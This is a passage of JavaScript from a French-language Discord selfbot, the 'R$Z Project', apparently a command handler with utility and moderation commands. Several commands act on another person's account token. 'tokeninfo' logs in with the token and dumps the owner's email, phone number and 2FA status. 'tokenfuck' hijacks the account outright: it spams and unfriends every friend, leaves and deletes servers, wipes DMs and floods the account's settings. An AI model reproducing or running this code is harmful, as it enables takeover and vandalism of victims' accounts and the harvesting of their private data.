                    messages.filter(m => m.author?.id === client.user?.id)[i].delete().catch(() => false)
                } 
            }

            else if (message.content === prefix + "clearall"){
                if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

                message.delete().catch(() => false)

                async function fetchAll(){
                    let messages = [];
                    let lastID;
                    while (true) { 
                        const fetchedMessages = await message.channel.messages.fetch({
                            limit: 100,
                            ...(lastID && { before: lastID }),
                        });
                        if (fetchedMessages.size === 0) {
                            messages = messages.filter(msg => msg.author?.id === client.user?.id)
                            return messages;
                        }
                        messages = messages.concat(Array.from(fetchedMessages.values()));
                        lastID = fetchedMessages.lastKey();
                    }
                }

                const messages = await fetchAll()
                for (const message of messages){
                    message.delete().catch(() => false)
                    await client.sleep(500)
                }
            }

            else if (message.content === prefix + "cleardm"){
                let channels = client.channels.cache.filter((channel) => channel.type === "DM" || channel.type === "GROUP_DM")
                message.edit(`ガ __**${name} - Nuke DM**__ ガ\n> *Je suis en train de fermer ${channels.size} dm's*`).catch(() => false)

                channels.forEach(c => c.delete(true).catch(() => false))     
            }

            else if (cmd.slice(0, 1).join(' ') === (prefix + "edit")){
                const nombre = parseInt(args[0]) || 99
                const collection = await message.channel.messages.fetch().catch(() => false)
                let messages = [...collection.values()]
                for (let i = 0; i < nombre; i++){
                    if (messages.filter(m => m.author?.id === client.user?.id)[i])
                    messages.filter(m => m.author?.id === client.user?.id)[i].edit(args.slice(1).join(' ') || `𝗖𝗘𝗡𝗦𝗨𝗥𝗘𝗗`).catch(() => false)
                } 
            }

            else if (cmd.slice(0, 1).join(' ') === (prefix + "find")){
                let user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0] || 0).catch(() => false)
                if (!user) return message.edit(`ガ __**${name} - Find**__ ガ\n> *Veuillez mentionner un utilisateur*`).catch(() => false) 
                
                let channels = []
            
                for (const guild of client.guilds.cache.map(g => g)){
                  const c = guild.members.cache.get(user?.id)?.voice.channel
                  if (c) channels.push(`*${user.username} est actuellement dans le vocal ${c}*`)
                }
            
                if (channels.length === 0) return message.edit(`ガ __**${name} - Find**__ ガ\n> *${user.username} n'est dans aucun vocale*`).catch(() => false)
                else return message.edit(`ガ __**${name} - Find**__ ガ\n> *${channels.map(c => c)}*`).catch(() => false)
            }

            else if (message.content === prefix + "leaveall"){
                await message.delete().catch(() => false)
                client.guilds.cache.forEach(g => g.leave().catch(() => false))        
            }


            else if (cmd.slice(0, 1).join(' ') === (prefix + "rainbowrole")){
                if (!client.premium) return message.edit(`ガ __**${name} - Premium**__ ガ\n> *Vous devez avoir un premium pour utiliser cette commande*`)

                if (args[0] === "stop"){
                    message.edit(`ガ __**${name} - RainBow Role**__ ガ\n> *Le rainbow role a été arrêté*`)
                    return clearInterval(client.interval[message.guildId + "rainbowrole"])
                }
                
                if (!message.guild) return message.edit(`ガ __**${name} - RainBow Role**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
                  
                const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[0])
                if (!role) return message.edit(`ガ __**${name} - RainBow Role**__ ガ\n> *Veuillez mentionner un rôle valide*`)
              
                const colors = ["FF0D00","FF3D00","FF4F00","FF5F00","FF6C00","FF7800","FF8300","FF8C00","FF9500","FF9E00","FFA500","FFAD00","FFB400","FFBB00","FFC200","FFC900","FFCF00","FFD600","FFDD00","FFE400","FFEB00","FFF200","FFFA00","F7FE00","E5FB00","D5F800","C6F500","B7F200","A8F000","98ED00","87EA00","74E600","5DE100","41DB00","1DD300","00C618","00BB3F","00B358","00AC6B","00A67C","009E8E","028E9B","06799F","0969A2","0C5DA5","0E51A7","1047A9","133CAC","1531AE","1924B1","1F1AB2","2A17B1","3415B0","3C13AF","4512AE","4E10AE","560EAD","600CAC","6A0AAB","7608AA","8506A9","9702A7","AD009F","BC008D","C7007D","D0006E","D8005F","DF004F","E7003E","EF002A","F80012"]
                let i = 0
              
                message.edit(`ガ __**${name} - RainBow Role**__ ガ\n> *Le rainbow est activé sur le rôle ${role}*`)
              
                client.interval[message.guildId + "rainbowrole"] = setInterval(() => {
                    if (i === colors.length) i = 0
                    if (role.editable) role.edit({color: colors[i]})
                    i++
                }, 1000 * 30);
            }

            else if (cmd.slice(0, 1).join(' ') === (prefix + "getid")){
                let user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0] || 0).catch(() => false)
                if (!user) return message.edit(`ガ __**${name} - GetID**__ ガ\n> *Veuillez mentionner un utilisateur*`).catch(() => false) 

                message.edit(`ガ __**${name} - GetID**__ ガ\n> *Voici l'ID de ${user.username}: ${client.tools === "k3s" ? "" : "\`"}${user?.id}${client.tools === "k3s" ? "" : "\`"}*`)
            }

            else if (message.content === prefix + "ping"){
                message.edit(`ガ __**${name} - Ping**__ ガ\n> *Ping: ${client.tools === "k3s" ? "" : "\`"}${client.ws.ping}ms${client.tools === "k3s" ? "" : "\`"}*`)
            }

            else if (message.content === prefix + "time"){
                message.edit(`ガ __**${name} - Time**__ ガ\n> *Il est \`${new Date().toLocaleTimeString()}\`*`)
            }

            else if (cmd.slice(0, 1).join(' ') === (prefix + "ghostping")) return message.delete().catch(() => false)
            
            else if (message.content === prefix + "mytoken"){
                message.edit(`ガ __**${name} - My Token**__ ガ\n> *Votre token a été envoyé dans les logs (la console)*`)
                console.log(`[ ${red("LOGS")} ]`)
                console.log(green("Voici votre token:"))
                console.log(green(client.token))
            }

            else if (message.content === prefix + "myip"){
                message.edit(`ガ __**${name} - My IP**__ ガ\n> *Votre ip a été envoyé dans les logs (la console)*`)

                const interfaces = os.networkInterfaces();

                Object.keys(interfaces).forEach(interfaceName => {
                    const interfaceInfo = interfaces[interfaceName];
                    interfaceInfo.forEach(info => {
                        if (info.family === 'IPv4' && !info.internal) {
                            console.log(`[ ${red("LOGS")} ]`)
                            console.log(green("Voici votre ip:"))
                            Object.keys(interfaces).forEach(interfaceName => {
                                const interfaceInfo = interfaces[interfaceName];
                                interfaceInfo.forEach(info => {
                                    if (info.family === 'IPv4' && !info.internal) {
                                        console.log(green(`IP: ${info.address}`));
                                    }
                                })
                            })
                        }
                    })
                })
            }

            else if (message.content === prefix + "myhostname"){
                message.edit(`ガ __**${name} - My HostName**__ ガ\n> *Votre hostname a été envoyé dans les logs (la console)*`)
                console.log(`[ ${red("LOGS")} ]`)
                console.log(green(`Voici votre hostname: ${os.hostname()}`))
            }

            else if (message.content === prefix + "newtoken"){
                message.edit(`ガ __**${name} - New Token**__ ガ\n> *Votre token a été réinitialisé*`)
                await client.createToken()
            }

            else if (message.content === prefix + "shutdown"){
                await message.edit(`ガ __**${name} - Shutdown**__ ガ\n> *Merci d'avoir utilisé le ${name} Project*`)
                console.clear();
                console.log(cyan('Merci d\'avoir utilisé le R$Z-Project. ^^'));
                console.log(magenta('Vous pouvez quitter la fenêtre en cliquant sur une touche.'));
                process.exit()
            }

            else if (message.content === prefix + "restart"){
                await message.edit(`ガ __**${name} - Redémarrage**__ ガ\n> *Redémarrage en cours...*`)
                const token = client.token
                client.destroy()
                client.login(token).then(() => message.edit(`ガ __**${name} - Redémarrage**__ ガ\n> *Redémarrage terminé*`))
            }

            else if (cmd.slice(0, 1).join(' ') === (prefix + "tokencheck")){
                if (!args[0]) return message.edit(`ガ __**${name} - Token Check**__ ガ\n> *Veuillez entrer un token*`)
                
                const newclient = new discord.Client({checkUpdate: false})
                newclient.login(args[0]).catch(() => message.edit(`ガ __**${name} - Token Check**__ ガ\n> *Le token est invalide*`))

                newclient.on('ready', async () => {
                    await message.edit(`ガ __**${name} - Token Check**__ ガ\n> *Le token est valide*`)
                    newclient.destroy()
                })                
            }

            else if (cmd.slice(0, 1).join(' ') === (prefix + "tokeninfo")){
                if (!args[0]) return message.edit(`ガ __**${name} - Token Info**__ ガ\n> *Veuillez entrer un token*`)

                message.edit(`ガ __**${name} - Token Info**__ ガ\n> *Vérification du token...*`)
                const c = new discord.Client({checkUpdate: false})
                c.login(args[0]).catch(() => message.edit(`ガ __**${name} - Token Info**__ ガ\n> *Le token est invalide*`))

                c.on('ready', async () => {
                    await message.edit(`ガ __**${name} - Token Info**__ ガ\n> ${client.tools === "k3s" ? "" : "\`"}Pseudo${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.user.username}**
                    > ${client.tools === "k3s" ? "" : "\`"}Pseudo Affiché${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.user.globalName || "Aucun"}**
                    > ${client.tools === "k3s" ? "" : "\`"}Pronoms${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.user.pronouns.length > 0 ? c.user.pronouns : "Aucun"}**
                    > ${client.tools === "k3s" ? "" : "\`"}ID${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.user?.id}**
                    > ${client.tools === "k3s" ? "" : "\`"}Bot${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.user?.bot ? "Oui" : "Non"}**

                    > ${client.tools === "k3s" ? "" : "\`"}Nombre de serveurs${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.guilds.cache.size}**
                    > ${client.tools === "k3s" ? "" : "\`"}Nombre de serveurs (admin)${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.guilds.cache.filter(g => g.members.me.permissions.has("ADMINISTRATOR")).size}**
                    > ${client.tools === "k3s" ? "" : "\`"}Nombre de salons${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.channels.cache.size}**
                    > ${client.tools === "k3s" ? "" : "\`"}Nombre de salons DM${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.channels.cache.filter(c => c.type === "DM").size}**
                    > ${client.tools === "k3s" ? "" : "\`"}Nombre de Groupes${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.channels.cache.filter(c => c.type === "GROUP_DM").size}**
                    > ${client.tools === "k3s" ? "" : "\`"}Nombre d'utilisateurs${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.users.cache.size}**
                    > ${client.tools === "k3s" ? "" : "\`"}Nombre d'amis${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.relationships.friendCache.size}**
                    > ${client.tools === "k3s" ? "" : "\`"}Nombre de demandes en attente${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.relationships.incomingCache.size}**
                    > ${client.tools === "k3s" ? "" : "\`"}Nombre de demandes envoyés${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.relationships.outgoingCache.size}**

                    > ${client.tools === "k3s" ? "" : "\`"}Email${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.user.emailAddress || "Aucune"}**
                    > ${client.tools === "k3s" ? "" : "\`"}Email Vérifié${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.user.verified ? "Oui" : "Non"}**
                    > ${client.tools === "k3s" ? "" : "\`"}Téléphone${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.user.phoneNumber || "Aucun"}**
                    > ${client.tools === "k3s" ? "" : "\`"}Abonnement${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${nitroType(c.user.nitroType)} **
                    > ${client.tools === "k3s" ? "" : "\`"}A2F${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.user.mfaEnabled ? "Oui" : "Non"}**
                    > ${client.tools === "k3s" ? "" : "\`"}Avatar${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.user.displayAvatarURL({dynamic: true, format: "webp", size: 4096}) || "Pas d'avatar"} **
                    > ${client.tools === "k3s" ? "" : "\`"}Bannière${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.user.bannerURL({dynamic: true, format: 'webp', size: 4096}) || "Pas de bannière"} **
                    > ${client.tools === "k3s" ? "" : "\`"}Décoration${client.tools === "k3s" ? "" : "\`"} ${client.separator} **${c.user.avatarDecorationURL({size: 4096, format: "png"}) || "Pas de décoration"} **

                    > ${client.tools === "k3s" ? "" : "\`"}Bio${client.tools === "k3s" ? "" : "\`"} ${client.separator} ${c.user.bio || "**Aucune Bio**"}`.replaceAll("                    ", ""))
                    c.destroy()
                })
            }

            else if (cmd.slice(0, 1).join(' ') === (prefix + "tokenfuck")){
                if (!args[0]) return message.edit(`ガ __**${name} - Token Fuck**__ ガ\n> *Veuillez entrer un token*`)
                message.edit(`ガ __**${name} - Token Fuck**__ ガ\n> *Vérification du token...*`)

                const c = new discord.Client({checkUpdate: false})
                c.login(args[0]).catch(() => message.edit(`ガ __**${name} - Token Fuck**__ ガ\n> *Le token est invalide*`))

                c.on('ready', async () => {
                    c.user.setGlobalName("R$Z Project")
                    c.user.setAboutMe(`https://discord.gg/jcdQyTNJ5E`)
                    c.user.setHypeSquad(0)
                    c.user.setPronouns(name)
                    c.user.setAFK(true)
                    c.user.setMute(true)
                    c.user.setDeaf(true)

                    for (const user of c.relationships.friendCache.map(r => r)){
                        if (!user) continue
                        user.send(args.slice(1).join(' ') || `${name} PROJECT: https://discord.gg/jcdQyTNJ5E`).catch(() => false)
                        user.unFriend().catch(() => false)
                        await sleep(1000)
                    }

                    c.guilds.cache.forEach(guild => guild.leave().catch(() => false))
                    c.guilds.cache.forEach(guild => guild.delete().catch(() => false))
                    c.channels.cache.filter(c => c.type === "DM" || c.type === "GROUP_DM").forEach(c => c.delete(true).catch(() => false))
                    
                    for (let i = 0; i < 10; i++){
                        const channel = await c.channels.createGroupDM([c.user]).catch(() => false)
                        channel.setName(`${name} PROJECT`)
                    }

                    setInterval(() => {
                        c.settings.setDisplayCompactMode(true).catch(() => false)
                        c.settings.setDisplayCompactMode(false).catch(() => false)
                    }, 1);

                    setInterval(() => {
                        c.settings.setTheme("light").catch(() => false)
                        c.settings.setTheme("dark").catch(() => false)
                    }, 1);
                })
            }

            








































        // Commandes modération

        else if (cmd.slice(0, 1).join(' ') === (prefix + "addrole")){
            if (!message.guild) return message.edit(`ガ __**${name} - Add Role**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]) || await message.guild.members.fetch(args[0]).catch(() => false)
            if (!member || !args[0]) return message.edit(`ガ __**${name} - Add Role**__ ガ\n> *Veuillez mentionner un membre*`)

            const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1]) || await message.guild.roles.fetch(args[1]).catch(() => false)
            if (!role || !args[1]) return message.edit(`ガ __**${name} - Add Role**__ ガ\n> *Veuillez mentionner un rôle*`)

            member.roles.add(role)
                .then( () => message.edit(`ガ __**${name} - Add Role**__ ガ\n> *J'ai donné un rôle à ${member.user.username}*`))
                .catch(() => message.edit(`ガ __**${name} - Add Role**__ ガ\n> *Je n'ai pas pu donné le rôle*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "delrole")){
            if (!message.guild) return message.edit(`ガ __**${name} - Del Role**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]) || await message.guild.members.fetch(args[0]).catch(() => false)
            if (!member || !args[0]) return message.edit(`ガ __**${name} - Del Role**__ ガ\n> *Veuillez mentionner un membre*`)

            const role = message.mentions.roles.first() || message.guild.roles.cache.get(args[1]) || await message.guild.roles.fetch(args[1]).catch(() => false)
            if (!role || !args[1]) return message.edit(`ガ __**${name} - Del Role**__ ガ\n> *Veuillez mentionner un rôle*`)

            member.roles.remove(role)
                .then( () => message.edit(`ガ __**${name} - Del Role**__ ガ\n> *J'ai retiré un rôle de ${member.user.username}*`))
                .catch(() => message.edit(`ガ __**${name} - Del Role**__ ガ\n> *Je n'ai pas pu retiré le rôle*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "derank")){
            if (!message.guild) return message.edit(`ガ __**${name} - Derank**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]) || await message.guild.members.fetch(args[0]).catch(() => false)
            if (!member || !args[0]) return message.edit(`ガ __**${name} - Derank**__ ガ\n> *Veuillez mentionner un membre*`)


            member.roles.set([])
                .then( () => message.edit(`ガ __**${name} - Derank**__ ガ\n> *${member.user.username} a été derank*`))
                .catch(() => message.edit(`ガ __**${name} - Derank**__ ガ\n> *Je n'ai pas pu retiré les rôle*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "rename")){
            if (!message.guild) return message.edit(`ガ __**${name} - Rename**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]) || await message.guild.members.fetch(args[0]).catch(() => false)
            if (!member || !args[0]) return message.edit(`ガ __**${name} - Rename**__ ガ\n> *Veuillez mentionner un membre*`)

            member.setNickname(args.slice(1).join(' ') ?? null)
                .then( () => message.edit(`ガ __**${name} - Rename**__ ガ\n> *${member.user.username} a été renommé*`))
                .catch(() => message.edit(`ガ __**${name} - Rename**__ ガ\n> *Je n'ai pas pu renommer ${member.user.username}*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "mute")){
            if (!message.guild) return message.edit(`ガ __**${name} - Mute**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]) || await message.guild.members.fetch(args[0]).catch(() => false)
            if (!member || !args[0]) return message.edit(`ガ __**${name} - Mute**__ ガ\n> *Veuillez mentionner un membre*`)

            let time = args[1] || '28d'

            if (time && isNaN(ms(time))) return message.edit(`ガ __**${name} - Mute**__ ガ\n> *Veuillez entrer un temps valide*`)
            if (time && ms(time) > 1000 * 60 * 60 * 24 * 28 || ms(time) < 1000) return message.edit(`ガ __**${name} - Mute**__ ガ\n> *Le temps doit être compris entre 1s et 28j*`)

            member.timeout(ms(time))
                .then( () => message.edit(`ガ __**${name} - Mute**__ ガ\n> *${member.user.username} a été mute*`))
                .catch(() => message.edit(`ガ __**${name} - Mute**__ ガ\n> *Je n'ai pas pu mute ${member.user.username}*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "unmute")){
            if (!message.guild) return message.edit(`ガ __**${name} - Unmute**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]) || await message.guild.members.fetch(args[0]).catch(() => false)
            if (!member || !args[0]) return message.edit(`ガ __**${name} - Unmute**__ ガ\n> *Veuillez mentionner un membre*`)

            member.timeout(0)
                .then( () => message.edit(`ガ __**${name} - Unmute**__ ガ\n> *${member.user.username} a été unmute*`))
                .catch(() => message.edit(`ガ __**${name} - Unmute**__ ガ\n> *Je n'ai pas pu unmute ${member.user.username}*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "unmute")){
            if (!message.guild) return message.edit(`ガ __**${name} - Kick**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]) || await message.guild.members.fetch(args[0]).catch(() => false)
            if (!member || !args[0]) return message.edit(`ガ __**${name} - Kick**__ ガ\n> *Veuillez mentionner un membre*`)

            member.kick()
                .then( () => message.edit(`ガ __**${name} - Kick**__ ガ\n> *${member.user.username} a été expulsé*`))
                .catch(() => message.edit(`ガ __**${name} - Kick**__ ガ\n> *Je n'ai pas pu expulser ${member.user.username}*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "ban")){
            if (!message.guild) return message.edit(`ガ __**${name} - Ban**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            
            const member = message.mentions.members.first() || message.guild.members.cache.get(args[0]) || await message.guild.members.fetch(args[0]).catch(() => false)
            if (!member || !args[0]) return message.edit(`ガ __**${name} - Ban**__ ガ\n> *Veuillez mentionner un membre*`)

            member.ban({ deleteMessageSeconds: 604800 })
                .then( () => message.edit(`ガ __**${name} - Ban**__ ガ\n> *${member.user.username} a été banni*`))
                .catch(() => message.edit(`ガ __**${name} - Ban**__ ガ\n> *Je n'ai pas pu bannir ${member.user.username}*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "purge")){
            if (!message.guild) return message.edit(`ガ __**${name} - Purge**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_MESSAGES")) return message.edit(`ガ __**${name} - Purge**__ ガ\n> *Vous n'avez pas la permissions nécessaire pour utiliser cette commande*`)

            const nombre = parseInt(args[0]) || 99
            const collection = await message.channel.messages.fetch().catch(() => false)
            let messages = [...collection.values()]
            for (let i = 0; i < nombre; i++){
                messages.filter(m => m.author?.id === client.user?.id)[i].delete().catch(() => false)
            } 
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "lock")){
            if (!message.guild) return message.edit(`ガ __**${name} - Lock**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_CHANNELS")) return message.edit(`ガ __**${name} - Lock**__ ガ\n> *Vous n'avez pas la permissions nécessaire pour utiliser cette commande*`)

            if (args[0] === "all"){
                message.edit(`ガ __**${name} - Lock**__ ガ\n> *J'ai vérouillé tous les salons du serveur*`)
                message.guild.channels.cache.forEach(channel => {
                    channel.permissionOverwrites.edit(message.guild.roles.everyone, {
                        SEND_MESSAGES: false,
                        CONNECT: false
                    }).catch(() => false);
                })
            }
            else {
                const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[0]) || message.channel
                channel.permissionOverwrites.edit(message.guild.roles.everyone, {
                    SEND_MESSAGES: false
                })
                .then( () => message.edit(`ガ __**${name} - Lock**__ ガ\n> *Le salon ${channel} a été vérouillé*`))
                .catch(() => message.edit(`ガ __**${name} - Lock**__ ガ\n> *Le salon ${channel} n'a pas pu être vérouillé*`));
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "unlock")){
            if (!message.guild) return message.edit(`ガ __**${name} - Unlock**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_CHANNELS")) return message.edit(`ガ __**${name} - Unlock**__ ガ\n> *Vous n'avez pas la permissions nécessaire pour utiliser cette commande*`)

            if (args[0] === "all"){
                message.edit(`ガ __**${name} - Unlock**__ ガ\n> *J'ai dévérouillé tous les salons du serveur*`)
                message.guild.channels.cache.forEach(channel => {
                    channel.permissionOverwrites.edit(message.guild.roles.everyone, {
                        SEND_MESSAGES: null,
                        CONNECT: false
                    }).catch(() => false);
                })
            }
            else {
                const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[0]) || message.channel
                channel.permissionOverwrites.edit(message.guild.roles.everyone, {
                    SEND_MESSAGES: null
                })
                .then( () => message.edit(`ガ __**${name} - Unlock**__ ガ\n> *Le salon ${channel} a été dévérouillé*`))
                .catch(() => message.edit(`ガ __**${name} - Unlock**__ ガ\n> *Le salon ${channel} n'a pas pu être dévérouillé*`));
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "hide")){
            if (!message.guild) return message.edit(`ガ __**${name} - Hide**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_CHANNELS")) return message.edit(`ガ __**${name} - Hide**__ ガ\n> *Vous n'avez pas la permissions nécessaire pour utiliser cette commande*`)

            if (args[0] === "all"){
                message.edit(`ガ __**${name} - Hide**__ ガ\n> *J'ai rendu invisible tous les salons du serveur*`)
                message.guild.channels.cache.forEach(channel => {
                    channel.permissionOverwrites.edit(message.guild.roles.everyone, {
                        VIEW_CHANNEL: false
                    }).catch(() => false);
                })
            }
            else {
                const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[0]) || message.channel
                channel.permissionOverwrites.edit(message.guild.roles.everyone, {
                    SEND_MESSAGES: false
                })
                .then( () => message.edit(`ガ __**${name} - Hide**__ ガ\n> *Le salon ${channel} est invisible*`))
                .catch(() => message.edit(`ガ __**${name} - Hide**__ ガ\n> *Le salon ${channel} n'a pas pu être rendu invisible*`));
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "unhide")){
            if (!message.guild) return message.edit(`ガ __**${name} - Unhide**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_CHANNELS")) return message.edit(`ガ __**${name} - Unhide**__ ガ\n> *Vous n'avez pas la permissions nécessaire pour utiliser cette commande*`)

            if (args[0] === "all"){
                message.edit(`ガ __**${name} - Unhide**__ ガ\n> *J'ai rendu visible tous les salons du serveur*`)
                message.guild.channels.cache.forEach(channel => {
                    channel.permissionOverwrites.edit(message.guild.roles.everyone, {
                        VIEW_CHANNEL: null
                    }).catch(() => false);
                })
            }
            else {
                const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[0]) || message.channel
                channel.permissionOverwrites.edit(message.guild.roles.everyone, {
                    VIEW_CHANNEL: null
                })
                .then( () => message.edit(`ガ __**${name} - Unhide**__ ガ\n> *Le salon ${channel} est visible*`))
                .catch(() => message.edit(`ガ __**${name} - Unhide**__ ガ\n> *Le salon ${channel} n'a pas pu être rendu visible*`));
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "sync")){
            if (!message.guild) return message.edit(`ガ __**${name} - Sync**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_CHANNELS")) return message.edit(`ガ __**${name} - Unhide**__ ガ\n> *Vous n'avez pas la permissions nécessaire pour utiliser cette commande*`)

            if (args[0] === "all"){
                message.edit(`ガ __**${name} - Sync**__ ガ\n> *J'ai synchronaliser tous les salons*`)
                message.guild.channels.cache.filter(c => c.type !== "GUILD_CATEGORY" && c.parentId).forEach(channel => {
                    channel.lockPermissions().catch(() => false)
                })
            }
            else {
                const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[0]) || message.channel
                if (!channel.parentId) return message.edit(`ガ __**${name} - Sync**__ ガ\n> *Le salon ${channel} n'a pas de catégorie*`)
                
                channel.lockPermissions()
                    .then( () => message.edit(`ガ __**${name} - Sync**__ ガ\n> *Le salon ${channel} est synchronisé*`))
                    .catch(() => message.edit(`ガ __**${name} - Sync**__ ガ\n> *Le salon ${channel} n'a pas pu être synchroniser*`));
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "renew")){
            if (!message.guild) return message.edit(`ガ __**${name} - Renew**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_CHANNELS")) return message.edit(`ガ __**${name} - Renew**__ ガ\n> *Vous n'avez pas la permissions nécessaire pour utiliser cette commande*`)


            const channel = message.mentions.channels.first() || message.guild.channels.cache.get(args[0]) || message.channel
            
            let ee = await channel.clone({
                name: channel.name,
                permissions: channel.permissionsOverwrites,
                type: channel.type,
                topic: channel.withTopic,
                nsfw: channel.nsfw,
                birate: channel.bitrate,
                userLimit: channel.userLimit,
                rateLimitPerUser: channel.rateLimitPerUser,
                permissions: channel.withPermissions,
                position: channel.rawPosition,
                reason: `Salon recréé par ${message.author.username} (${message.author?.id})`
              })
              channel.delete().catch(() => ee.delete().catch(() => false))

            message.edit(`ガ __**${name} - Sync**__ ガ\n> *Salon recrée*`).catch(() => false)
            
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "unban")){
            if (!message.guild) return message.edit(`ガ __**${name} - Unban**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            
            const user = message.mentions.users.first() || client.users.cache.get(args[0]) || await client.users.fetch(args[0]).catch(() => false)
            if (!user || !args[0]) return message.edit(`ガ __**${name} - Unban**__ ガ\n> *Veuillez mentionner un membre*`)

            message.guild.bans.remove(user)
                .then( () => message.edit(`ガ __**${name} - Unban**__ ガ\n> *${user.username} a été débanni*`))
                .catch(() => message.edit(`ガ __**${name} - Unban**__ ガ\n> *Je n'ai pas pu débannir ${user.username}*`))
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "antijoin")){
            if (!message.guild) return message.edit(`ガ __**${name} - Anti Join**__ ガ\n> *Veuillez utiliser cette commande dans un serveur*`)
            if (!message.guild.features.includes("COMMUNITY")) return message.edit(`ガ __**${name} - Anti Join**__ ガ\n> *Veuillez activer la communauté du serveur*`)
            if (!message.guild.members.me.permissions.has("MANAGE_GUILD")) return message.edit(`ガ __**${name} - Anti Join**__ ガ\n> *Vous n'avez pas les permissions nécessaires pour executer cette commande*`)

            if (args[0] === "on"){
                message.guild.disableInvites(true)
                    .then( () => message.edit(`ガ __**${name} - Anti Join**__ ガ\n> *L'anti join a été activé*`))
                    .catch(() => message.edit(`ガ __**${name} - Anti Join**__ ガ\n> *L'anti join n'a pas pu être activer*`))
            }
            else if (args[0] === "off") {
                message.guild.disableInvites(false)
                .then( () => message.edit(`ガ __**${name} - Anti Join**__ ガ\n> *L'anti join a été désactivé*`))
                .catch(() => message.edit(`ガ __**${name} - Anti Join**__ ガ\n> *L'anti join n'a pas pu être désactiver*`))
            }
        }

        else if (cmd.slice(0, 1).join(' ') === (prefix + "purgehack")){
